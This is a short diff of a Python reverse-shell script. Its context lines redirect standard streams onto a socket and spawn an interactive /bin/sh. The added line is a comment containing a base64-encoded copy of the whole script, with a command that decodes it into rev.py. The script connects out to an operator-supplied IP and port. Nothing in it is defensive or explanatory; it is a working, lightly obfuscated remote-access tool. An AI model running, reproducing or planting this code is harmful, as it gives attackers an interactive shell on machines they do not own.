@@ -10,3 +10,4 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 
 # python reverse.py IP PORTA
+# echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHN5cw0KDQp0YXJnZXRfaXAgPSBzeXMuYXJndlsxXQ0KdGFyZ2V0X3BvcnQgPSBzeXMuYXJndlsyXQ0Kcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkNCnMuY29ubmVjdCgodGFyZ2V0X2lwLGludCh0YXJnZXRfcG9ydCkpKQ0Kb3MuZHVwMihzLmZpbGVubygpLDApDQpvcy5kdXAyKHMuZmlsZW5vKCksMSkNCm9zLmR1cDIocy5maWxlbm8oKSwyKQ0KcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkNCg0KIyBweXRob24gcmV2ZXJzZS5weSBJUCBQT1JUQQ== | base64 -d > rev.py
